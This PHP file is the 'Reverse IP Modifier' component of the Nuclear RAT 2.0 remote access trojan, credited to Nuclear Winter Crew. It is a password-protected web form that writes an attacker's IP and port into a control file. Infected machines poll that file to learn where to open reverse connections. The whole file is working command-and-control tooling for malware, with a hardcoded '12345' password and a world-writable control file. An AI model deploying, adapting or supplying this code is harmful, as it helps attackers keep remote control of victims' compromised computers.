<?php
	/*
	CHMOD the $ctrl_file to 646! This file allows you
	to modify your IP on the FTP without connecting
	to it. It works like a DNS, but changes a file
	remotely, so the servers can check it, and see
	if they may connect, and where. 
	Change the value of $ctrl_file variable if 
	needed.
	*/
	
	$admin_pass = "12345"; //change this to a desired pass, max 18 chars
	$ctrl_file = "ip.txt"; // File name to write the IP (point your server to this file when creating it, in the IP via URL field)

	$action = $_POST["action"];
	$pwd = $_POST["pwd"];
	$status = "<p>Your current WAN IP is: " . $_SERVER["REMOTE_ADDR"]."</p>";

	if (($action == "1") && ($pwd == $admin_pass)) {
		$IP = $_POST["ip"];
		$PORT = $_POST["port"];
		$STATE = $_POST["state"];
		$status = "<p>An error happened when setting the selected options</p>";
		if ($STATE == "on") $STATE = 1;
		else $STATE = 0;

		if ($IP && $PORT) {
			$IP = gethostbyname(trim($IP));
			$fp = fopen("$ctrl_file", "wb");
			if ($fp){
				fputs($fp, pack("CNS", $STATE, ip2long($IP), $PORT));
				fclose($fp);
				$status = "<p>IP via URL function updated!</p>";
			}
		} else if ($STATE == 0) {
			$fp = fopen("$ctrl_file", "wb");
			if ($fp){
				fputs($fp, pack("ClS", $STATE, 0, 0));
				fclose($fp);
				$status = "<p>IP via URL function updated! State changed to offline</p>";
			}
		}
	}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Reverse IP Modifier - Nuclear RAT 2.0</title>
</head>
<style>
table {
	font-size: 10pt;
    background-color: #BFBFBF;
    padding: 5px;
    margin: 0px auto;
    align: center;
	}
td  {
	background-color: #E5E5E5;
    color: #1A1A1A;
    text-align: center;
    padding: 6px;
	}
body{
	font-size: 10pt;
	font-family: verdana;
	color: #999999;
	background-color: #E5E5E5;
	margin: 3px;
	}
	.hand {text-decoration: none; cursor:hand}
	a {color: #999999}
</style>
<body>
<div align="center">
  <p><h2>Reverse IP Modifier - Nuclear RAT 2.0</h2></p>
  <?php echo $status; ?>
  <form id="form1" name="form1" method="post" action="">
    <table width="524" border="0">
      <tr>
        <td>Should the server check for the IP and port in the file?</td>
        <td><input type="checkbox" name="state" id="state"></td>
      </tr>
      <tr>
        <td width="360">IP or DNS for reverse connection</td>
        <td width="154"><input name="ip" type="text" id="ip" maxlength="255" /></td>
      </tr>
      <tr>
        <td>Port listening on client</td>
        <td><input name="port" type="text" id="port" maxlength="5" /></td>
      </tr>
      <tr>
        <td>Password needed to change this setting</td>
        <td><input name="pwd" type="text" id="pwd" maxlength="18"></td>
      </tr>
      <tr>
        <td colspan="2"><input type="submit" value="Submit" />
        <input name="action" type="hidden" id="action" value="1"></td>
      </tr>
    </table>
  </form>
  <a class="hand" href="http://www.nuclearwintercrew.com" target="_new"><b>Nuclear Winter Crew 2007</b>
</div>
</body>
</html>